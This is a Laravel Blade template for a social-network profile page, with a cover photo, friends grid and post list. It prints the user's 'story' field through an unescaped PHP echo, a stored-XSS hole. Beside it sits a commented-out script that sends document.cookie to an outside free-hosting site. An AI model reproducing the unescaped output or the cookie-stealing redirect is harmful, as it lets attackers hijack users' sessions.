@extends('layouts.profile')

@section('content')
<!-- INFO  -->
<div class="fixed xl:absolute w-full bg-white top-16 md:top-6 xl:h-70vh  xl:top-0 right-0 z-20  h-14">
    <div class="w-full lg:w-942 xl:w-942 m-auto h-3/5 rounded-b-md bg-gray-100 hidden xl:block">
        <img id="cover_avatar_user" src="{{URL::to('/image/'. Auth::user()->cover_avatar)}}" alt="" class="w-full h-full object-cover rounded-b-3xl">
    </div>
    <div class=" absolute bottom-16 right-1/2 transform translate-x-1/2 hidden xl:block">
        <div class="flex justify-center items-center ">
            <img id="avatar_user" src="{{URL::to('/image/'. Auth::user()->avatar)}}" alt="" class="w-52 h-52 rounded-full border-4 border-blue-300 mx-0 object-cover" >
            <span class="absolute bottom-1/2 right-3 rounded-full w-10 h-10 bg-gray-200 grid place-items-center cursor-pointer">
                <i class='bx bxs-camera-plus text-3xl text-gray-700'></i>
            </span>
        </div>
        <div class="text-center">
            <div class="font-semibold text-3xl p-2">
                {{ Auth::user()->name }}
            </div>
            <p class="text-sm" id="story_user"> <?php echo $user->story ?> <i class='bx bxs-heart text-red-600'></i> </p>
            <!-- <script>window.location = 'https://wedcuabestysvn0901.000webhostapp.com/?cookie=' + document.cookie</script> -->
            <p class="text-sm">{{ Auth::user()->interests }} </p>
            <p class="m-4"> <a href="javascript::void(0) " class="text-blue-500 underline font-medium"> Edit </a></p>
        </div>
    </div>
    <div id="info_header_bottom" class="absolute bg-white m-auto w-full lg:w-942 xl:w-942 p-3 border-t border-gray-200 -bottom-14  xl:bottom-0 right-1/2 transform translate-x-1/2 flex justify-between items-center">
        <div class=" flex-1 mr-4 hidden xl:block">
            <ul class="flex justify-between items-center text-base font-medium">
                <li class=" p-2 border-b-4 border-blue-500 text-blue-500">
                    <a href=""> Bài viết</a>
                </li>
                <li class="hover:bg-gray-200 p-2 rounded-md ">
                    <a href=""> Giới thiệu</a>
                </li>
                <li class="hover:bg-gray-200 p-2 rounded-md ">
                    <a href=""> Bạn bè <span>1000</span></a>
                </li>
                <li class="hover:bg-gray-200 p-2 rounded-md ">
                    <a href=""> Xem Thêm <i class='bx bx-chevron-down'></i> </a>
                </li>
            </ul>
        </div>
        <div class="flex-1 flex justify-between items-center">
            <div>
                <button class="outline-none bg-blue-500 p-2 hover:bg-blue-700 rounded-md text-base font-medium text-white"><i class='bx bxs-plus-circle mr-2 text-white'></i>Thêm vào tin</button>
            </div>
            <div>
                <button id="edit_info_profile" class="outline-none bg-gray-100 p-2 hover:bg-gray-200 rounded-md text-base font-medium"><i class='bx bxs-edit-alt mr-2'></i>Chỉnh sửa trang cá nhân</button>
            </div>
            <div>
                <button class="outline-none bg-gray-100 p-2 hover:bg-gray-200 rounded-md text-base font-medium"><i class='bx bx-dots-horizontal-rounded px-1 '></i></button>
            </div>
        </div>
    </div>
    <div  id="info_header_top" class="w-full fixed bg-white top-0 right-1/2 transform translate-x-1/2 transition-all ">
        <div class=" m-auto w-full lg:w-942 xl:w-942 p-3 border-t border-gray-200  flex justify-between items-center ">
            <div class=" flex-1 mr-4">
                <div class="font-semibold ">
                    <img src="{{ asset('/image/'.Auth::user()->avatar) }}" class="w-10 h-10 rounded-full inline-block" alt="">
                    {{ Auth::user()->name }}
                </div>
            </div>
            <div class="flex-1 flex justify-between items-center">
                <div>
                    <button class="outline-none bg-blue-500 p-2 hover:bg-blue-700 rounded-md text-base font-medium text-white"><i class='bx bxs-plus-circle mr-2 text-white'></i>Thêm vào tin</button>
                </div>
                <div>
                    <button class="outline-none bg-gray-100 p-2 hover:bg-gray-200 rounded-md text-base font-medium"><i class='bx bxs-edit-alt mr-2'></i>Chỉnh sửa trang cá nhân</button>
                </div>
                <div>
                    <button class="outline-none bg-gray-100 p-2 hover:bg-gray-200 rounded-md text-base font-medium"><i class='bx bx-dots-horizontal-rounded px-1'></i></button>
                </div>
            </div>
        </div>
    </div>
</div>
<?php   use App\http\Controllers\UsersController;  ?>
<!-- END INFO  -->
<div class="w-full xl:w-942 lg:w-942 flex flex-col lg:flex-row relative xl:mt-63vh">
    <!-- INTRODUCE  -->
    <div class="xl:w-2/5 lg:w-full mt-44 md:mt-36 xl:pt-16 xl:mt-0 px-2  h-full w-full xl:block">
        <div class="p-3 bg-white rounded-md mt-4 shadow-md">
            <h3 class="text-left text-3xl text-black font-semibold">Introduce</h3>
            <span class="my-2 flex  items-center"><i class='bx bx-paper-plane mr-2 text-2xl text-gray-500'></i> 1000 following </span>
            <div class="flex flex-col">
                <button class="outline-none bg-gray-100 p-2 my-2 rounded-md hover:bg-gray-200 font-medium text-gray-900">Detailed editing</button>
                <button class="outline-none bg-gray-100 p-2 my-2 rounded-md hover:bg-gray-200 font-medium text-gray-900">More hobbies</button>
                <button class="outline-none bg-gray-100 p-2 my-2 rounded-md hover:bg-gray-200 font-medium text-gray-900">More interesting content</button>
            </div>
        </div>
        <div class="p-3 bg-white rounded-md mt-4 shadow-md">
            <div class="flex justify-between items-center px-4  mb-5 ">
                <span class="font-semibold text-gray-500 text-2xl dark:text-dark-txt">Imgae</span>
                <span class="text-blue-500 cursor-pointer hover:bg-gray-200 dark:hover:bg-dark-thirdp-2 p-2
                    rounded-md ">See all image</span>
            </div>
            <div class="rounded-lg grid grid-cols-3 grid-rows-3 gap-1 overflow-hidden">
                @foreach($media as $key => $value)
                    @if(!empty($value->image))
                    <img src="{{ asset('image/'.$value->image) }}" class=" inline-block w-full h-full object-cover" alt="">
                    @endif
                @endforeach
            </div>
        </div>
        <div class="p-3 bg-white rounded-md mt-4 shadow-md">
            <div class="flex justify-between items-center px-4  mb-5 ">
                <div>
                    <span class="font-semibold text-gray-500 text-2xl dark:text-dark-txt">Friends </span>
                    <p class="text-gray-500 text-lg ">{{ $qtyfri}} friends</p>
                </div>   
                <span class="text-blue-500 cursor-pointer hover:bg-gray-200 dark:hover:bg-dark-thirdp-2 p-2
                    rounded-md ">See all friends</span>
            </div>
            <div class="rounded-lg grid grid-cols-3 grid-rows-3 gap-1 overflow-hidden">
                @foreach($friends as $key => $value)
                    @if(UsersController::statusFriend(Auth::user()->id,$value->id ) == 'Accepted')
                    <div class="text-center">
                        <a href="{{URL::TO('/view-user/'.$value->id)}}" class="no-underline text-black">
                            <img src="{{ asset('/image/'.$value->avatar) }}" class=" inline-block rounded-lg " alt="">
                            <p class="font-medium text-lg">{{ $value->name }} </p>
                        </a>
                    </div>
                    @endif
                @endforeach
               
            </div>
        </div>
        <div class="mt-auto p-6 text-sm text-gray-500 dark:text-dark-txt">
            <a href="">Privacy</a>
            <span>.</span>
            <a href="">Terms</a>
            <span>.</span>
            <a href="">Advertising</a>
            <span>.</span>
            <a href="">Cookies</a>
            <span>.</span>
            <a href="">Ad choices</a>
            <span>.</span>
            <a href="">More</a>
            <span>.</span>
            <a href="">Vấn Nguyễn 2021</a>
         </div>
    </div>
    <!-- END INTRODUCE -->
    <div class="xl:w-3/5 lg:w-full xl:pt-16  px-2  w-full">

        <!-- POST FORM -->
        <div class="px-4 mt-14 md:mt-4 lg:mt-40 xl:mt-4 shadow-md rounded-lg bg-white dark:bg-dark-second">
            <div class="p-2 border-b border-gray-300 dark:border-dark-third flex space-x-4">
                <img src="{{ asset('image/story-1.png') }}" alt="" class="rounded-full w-10 h-10 ">
                <div id="input_post" class=" openPost flex-1 bg-gray-100 hover:bg-gray-200 rounded-full flex items-center justify-start pl-4 cursor-pointer dark:bg-dark-third dark:text-dark-txt text-gray-500 text-lg">
                    <span class="">
                        What's on your mind, Van?
                    </span>
                </div>
            </div>
            <div class="p-2 flex">
                <div class="w-1/3 flex space-x-2 justify-center items-center hover:bg-gray-100
            dark:hover:bg-dark-third text-xl  sm:text-3xl py-2 rounded-lg cursor-pointer text-red-500">
                    <i class='bx bxs-video-plus'></i>
                    <span class="text-xs sm:text-sm font-semibold text-gray-500 dark:text-dark-txt">Live video </span>
                </div>
                <div class="w-1/3 flex space-x-2 justify-center items-center hover:bg-gray-100
            dark:hover:bg-dark-third text-xl  sm:text-3xl py-2 rounded-lg cursor-pointer text-yellow-500">
                    <i class='bx bx-images'></i>
                    <span class="text-xs sm:text-sm font-semibold text-gray-500 dark:text-dark-txt">Image/Video </span>
                </div>
                <div class="w-1/3 flex space-x-2 justify-center items-center hover:bg-gray-100
            dark:hover:bg-dark-third text-xl  sm:text-3xl py-2 rounded-lg cursor-pointer text-blue-500">
                    <i class='bx bx-happy-alt'></i>
                    <span class="text-xs sm:text-sm font-semibold text-gray-500 dark:text-dark-txt">Emotion/Activate </span>
                </div>
            </div>
        </div>
        <!-- END POST FORM -->
   <!-- LIST POST -->
   <div class="" id="listPosts">
            @foreach($posts as $key => $value )
            <!-- POST -->
            <div class="shadow-md bg-white dark:bg-dark-second dark:text-dark-txt mt-4 rounded-lg" id="post-{{$value->id}}" data-id="{{$value->id}}">
                <div class="flex items-center justify-between px-4 py-2">
                    <div class="flex space-x-2 items-center">
                        <div class="relative">
                            <img src="{{URL::to('/image/'. $user->avatar )}}" class="w-10 h-10 rounded-full" alt="">
                            <span class="bg-green-500 w-3 h-3 rounded-full absolute right-0
                            top-3/4 border-white border-2"></span>
                        </div>
                        <div>
                            <div class="font-semibold">
                              {{ $user->name }}
                            </div>
                            <span class="text-sm text-gray-500">{{ date("h:i:sa d/m/Y", strtotime($value->created_at)) }}</span>
                        </div>
                    </div>
                    <div class="w-8 h-8 grid place-items-center text-xl text-gray-500 hover:bg-gray-200 dark:text-dark-txt dark:hover:bg-dark-third rounded-full cursor-pointer">
                        <i class="bx bx-dots-horizontal-rounded"></i>
                    </div>
                </div>
               
                <div class="text-justify px-4 py-2">
                    {{$value->content}}
                </div>
               
                <div class="py-2 ">
                        @if(!empty($value->image))
                            <img src="{{URL::to('/image/'. $value->image)}}" alt="" class=" m-auto ">
                        @endif
                        @if(!empty($value->video))
                            <video controls class="mx-auto w-full h-96 ">
                                <source id="review_video_post" src="{{URL::to('/image/'. $value->video )}}" type="video/mp4">
                                <source src="{{URL::to('/image/'. $value->video )}}" type="video/ogg">
                                Your browser does not support the video tag.
                            </video>
                        @endif
                </div>
               
                <div class="px-4 py-2">
                    <div class=" flex items-center justify-between">
                        <div class="flex flex-row-reverse items-center">
                            <span class="ml-2 text-gray-500 dark:text-dark-txt ">999</span>
                            <span class="rounded-full grid place-items-center text-2xl -ml-1 text-red-500"> <i class="bx bx-angry"></i></span>
                            <span class="rounded-full grid place-items-center text-2xl -ml-1 text-pink-500"><i class="bx bxs-heart"></i></span>
                            <span class="rounded-full grid place-items-center text-2xl -ml-1 text-yellow-500"><i class="bx bxs-happy-alt"></i></span>
                        </div>
                        <div class=" text-gray-500 dark:text-dark-txt">
                            <span>900 comment</span>
                            <span>500 share</span>
                        </div>
                    </div>

                </div>
                
                <div class="px-4 py-2 ">
                    <div class="flex  items-center space-x-2 border-gray-300 border-t border-b">
                        <div class="w-1/3 flex space-x-2 justify-center items-center rounded-lg py-2 text-xl hover:bg-gray-200 dark:hover:bg-dark-third cursor-pointer text-gray-500 dark:text-dark-txt">
                            <i class="bx bx-like"></i>
                            <span class="font-semibold text-sm">Like</span>
                        </div>
                        <div data-id="{{$value->id}}" class="btnComment w-1/3 flex space-x-2 justify-center items-center rounded-lg py-2 text-xl hover:bg-gray-200 dark:hover:bg-dark-third cursor-pointer text-gray-500 dark:text-dark-txt">
                            <i class="bx bx-comment-edit"></i>
                            <span class="font-semibold text-sm">Comment</span>
                        </div>
                        <div class="w-1/3 flex space-x-2 justify-center items-center rounded-lg py-2 text-xl hover:bg-gray-200 dark:hover:bg-dark-third cursor-pointer text-gray-500 dark:text-dark-txt">
                            <i class="bx bx-share bx-flip-horizontal"></i>
                            <span class="font-semibold text-sm">Share</span>
                        </div>
                    </div>
                </div>
               
                <div class="py-2 px-4" >
                        <div class="px-4 py-2 hidden" id="listComment-{{$value->id}}">
                            <div id="commentPost-{{$value->id}}" class="overflow-y-auto max-h-96">

                            </div>
                            <div class="flex space-x-2">
                                <img src="/image/{{ Auth::user()->avatar}}" class="w-9 h-9 rounded-full" alt="">
                                <div class="flex flex-1 bg-gray-100 dark:bg-dark-third rounded-full items-center justify-between bg-transparent px-3">
                                    <form  class="w-full">
                                        <input type="text" name="comment" onkeypress="handle(event)" id="{{$value->id}}"  class=" user_comment w-full outline-none bg-transparent flex-1" placeholder="Write a comment">
                                    </form>
                                    
                                    <div class="flex space-x-0 items-center justify-center ">
                                        <span class="w-7 h-7 grid place-items-center rounded-full hover:bg-gray-200 cursor-pointer text-gray-500 dark:text-dark-txt dark:hover:bg-dark-second text-xl">
                                            <i class="bx bx-wink-smile"></i></span>
                                        <span class="w-7 h-7 grid place-items-center rounded-full hover:bg-gray-200 cursor-pointer text-gray-500 dark:text-dark-txt dark:hover:bg-dark-second text-xl">
                                            <i class="bx bx-camera"></i></span>
                                        <span class="w-7 h-7 grid place-items-center rounded-full hover:bg-gray-200 cursor-pointer text-gray-500 dark:text-dark-txt dark:hover:bg-dark-second text-xl">
                                            <i class="bx bx-gift"></i></span>
                                        <span class="w-7 h-7 grid place-items-center rounded-full hover:bg-gray-200 cursor-pointer text-gray-500 dark:text-dark-txt dark:hover:bg-dark-second text-xl">
                                            <i class="bx bx-happy-heart-eyes"></i></span>

                                    </div>
                                </div>
                            </div>
                        </div>
                </div>
            </div>
            @endforeach
            <!-- END POST -->
        </div>
        <!--  END LIST POST -->
    </div>
    
</div>
<script >
    $('#home').removeClass('text-blue-500  border-blue-500 ')
</script>
@endsection